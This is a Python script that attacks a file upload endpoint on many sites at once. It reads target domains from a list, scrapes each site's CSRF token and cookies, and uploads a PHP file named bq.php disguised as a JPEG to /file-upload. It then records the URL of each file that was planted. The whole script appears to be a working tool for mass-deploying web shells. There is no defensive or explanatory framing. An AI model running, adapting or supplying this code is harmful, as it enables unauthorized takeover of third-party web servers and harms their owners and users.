import requests
from bs4 import BeautifulSoup
import threading
import re
import urllib3
urllib3.disable_warnings()

lock = threading.Lock()

def get_csrf_and_cookie(domain):
    try:
        url = f"https://{domain}"
        sess = requests.Session()
        r = sess.get(url, timeout=15, verify=False)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf_token = soup.find("meta", {"name": "csrf-token"})["content"]
        cookies = sess.cookies.get_dict()
        return csrf_token, cookies
    except Exception as e:
        print(f"[!] Failed to retrieve token/cookie from {domain}: {e}")
        return None, None

def upload(domain):
    csrf_token, cookies = get_csrf_and_cookie(domain)
    if not csrf_token or not cookies:
        return

    url = f"https://{domain}/file-upload"
    headers = {
        "X-Csrf-Token": csrf_token,
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept": "*/*"
    }

    files = {
        "file": ("bq.php", open("bq.php", "rb"), "image/jpeg")
    }

    try:
        r = requests.post(url, headers=headers, cookies=cookies, files=files, timeout=15, verify=False)
        if r.status_code == 200 and '"status":true' in r.text:
            match = re.search(r'"file":"(https?:\\\/\\\/[^"]+)"', r.text)
            if match:
                file_url = match.group(1).replace("\\/", "/")
                print(f"[✓] {domain} => {file_url}")
                with lock:
                    with open("result.txt", "a") as f:
                        f.write(file_url + "\n")
            else:
                print(f"[✘] {domain} - Upload succeeded but no file URL found.")
        else:
            print(f"[✘] {domain} - Upload failed.")
    except Exception as e:
        print(f"[!] {domain} - Upload error: {e}")

def main():
    with open("list.txt", "r") as f:
        domains = [line.strip() for line in f if line.strip()]

    threads = []
    for domain in domains:
        t = threading.Thread(target=upload, args=(domain,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
